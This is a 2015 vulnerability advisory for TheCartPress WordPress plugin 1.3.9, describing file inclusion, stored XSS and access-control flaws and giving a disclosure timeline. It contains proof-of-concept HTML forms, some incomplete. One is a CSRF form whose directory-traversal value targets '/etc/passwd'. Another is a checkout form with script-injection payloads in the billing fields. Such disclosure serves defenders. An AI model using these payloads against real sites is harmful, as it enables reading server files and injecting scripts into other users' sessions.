Vendor: TheCartPress team
Vulnerable Version(s): 1.3.9 and probably prior
Tested Version: 1.3.9
Advisory Publication:  April 8, 2015  [without technical details]
Vendor Notification: April 8, 2015 
Public Disclosure: April 29, 2015 
Vulnerability Type: Cross-Site Scripting [CWE-79], PHP File Inclusion [CWE-98], Cross-Site Scripting [CWE-79], Improper Access Control [CWE-284]
CVE References: CVE-2015-3301, CVE-2015-3300, CVE-2015-3302
Risk Level: High 
CVSSv2 Base Scores: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C), 5 (AV:N/AC:L/Au:N/C:N/I:P/A:N), 5 (AV:N/AC:L/Au:N/C:N/I:P/A:N), 4.3 (AV:N/AC:M/Au:N/C:N/I:P/A:N)
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
 
-----------------------------------------------------------------------------------------------
 
Advisory Details:
 
High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in TheCartPress WordPress plugin, which can be exploited to execute arbitrary PHP code, disclose sensitive data, and perform Cross-Site Scripting attacks against users of WordPress installations with the vulnerable plugin.
 
1) Local PHP File Inclusion in TheCartPress WordPress plugin: CVE-2015-3301
 
Input passed via the "tcp_box_path" HTTP POST parameter passed to "/wp-admin/admin.php?page=checkout_editor_settings" URL is not properly verified before being used in PHP &#039;include()&#039; function, and can be abused to include arbitrary local files via directory traversal sequences.
 
In order to successfully exploit the vulnerability an attacker needs to have administrator privileges on WordPress installation, however this can be also exploited via CSRF vector to which the script is vulnerable as well. 
 
Simple CSRF exploit below will execute the content of &#039;/etc/passwd&#039; file when a logged-in administrator will visit a page with it:
 
<input type="hidden" name="tcp_save_fields"  value=&#039;1&#039;>
<input type="hidden" name="tcp_box_path"  value=&#039;../../../../../etc/passwd&#039;>
<input type="submit" id="btn">
</form>
<script>
 document.main.submit();
</script>
 
 
 
2) Stored XSS in TheCartPress WordPress plugin: CVE-2015-3300
 
During the checkout process, many user-supplied HTTP POST parameters (see complete list in PoC)in "Shipping address" and "Billing address" sections are not being sanitized before being stored in the local database. 
 
 
<input type="hidden" name="selected_billing_id"  value=&#039;1&#039;>
<input type="hidden" name="selected_billing_address"  value=&#039;new&#039;>
<input type="hidden" name="billing_firstname"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_lastname"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_company"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_tax_id_number"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_country_id"  value=&#039;AF&#039;>
<input type="hidden" name="billing_region_id"  value=&#039;&#039;>
<input type="hidden" name="billing_region"  value=&#039;&#039;>
<input type="hidden" name="billing_city"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_street"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_street_2"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_postcode"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_telephone_1"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_telephone_2"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_fax"  value=&#039;"><script>alert(/immuniweb/);</script>&#039;>
<input type="hidden" name="billing_email"  value=&#039;mail@mail.com&#039;>
<input type="hidden" name="tcp_continue"  value=&#039;&#039;>
<input type="hidden" name="tcp_step"  value=&#039;1&#039;>
<input type="submit" id="btn">
</form>
 
 
A non-authenticated attacker may inject malicious HTML and JS code that will be stored in the application database, and available to any non-authenticated user on the following URL:
 
 
As well as on the following URL accessible to WordPress administrator only:
 
 
 
3) Improper Access Control in TheCartPress WordPress plugin: CVE-2015-3302
 
Any non-authenticated user may browse orders of other users due to broken authentication mechanism. To reproduce the vulnerability an attacker shall first open the following URL:
 
And just after open the following URL to see full order details:
 
 
 
4) Multiple XSS in TheCartPress WordPress plugin (against administrator only): CVE-2015-3300
 
 
 
 
 
 
 
 
 
-----------------------------------------------------------------------------------------------
 
Solution:
 
2015-04-08 Vendor Alerted via emails.
2015-04-17 Vendor Alerted via contact form and emails.
2015-04-17 Vendor Alerted via WordPress Support Forums.
2015-04-27 Fix Requested via emails.
2015-04-29 Public disclosure.
 
Currently we are not aware of any official solution for this vulnerability.
 
We recommend disabling or removing the vulnerable plugin as a workaround.

